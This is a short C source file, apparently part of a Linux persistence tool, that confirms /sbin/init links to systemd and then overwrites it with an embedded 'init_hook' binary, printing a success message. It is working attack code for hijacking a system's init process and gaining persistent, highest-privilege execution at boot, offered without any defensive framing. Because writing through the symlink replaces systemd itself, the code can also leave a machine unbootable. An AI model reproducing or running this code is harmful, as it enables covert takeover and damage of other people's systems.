#include <limits.h>
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

#define INIT_PATH ("/sbin/init")

extern const char *init_hook;
extern const unsigned int init_hook_len;

int hook_init()
{
    // Make sure /sbin/init is a symlink to /lib/systemd/systemd.
    char *real_path;
    FILE *init;
    int bytes_written;

    real_path = realpath(INIT_PATH, NULL);

    if (strcmp(real_path, "/lib/systemd/systemd"))
    {
        perror("Could not hook /sbin/init - it is not a symlink to /lib/systemd/systemd.");
        free(real_path);
        return -1;
    }
    free(real_path);
    real_path = (char*)NULL;

    // Replace /sbin/init with our hook binary.
    init = fopen(INIT_PATH, "w");
    bytes_written = fwrite(init_hook, 1, init_hook_len, init);
    if (bytes_written != init_hook_len)
    {
        perror("Could not hook /sbin/init - write to file failed.");
        fclose(init);
        return -1;
    }

    fclose(init);
    perror("/sbin/init hooked successfuly!");
    return 0;
}


int main(int argc, char *argv[])
{
    hook_init();
}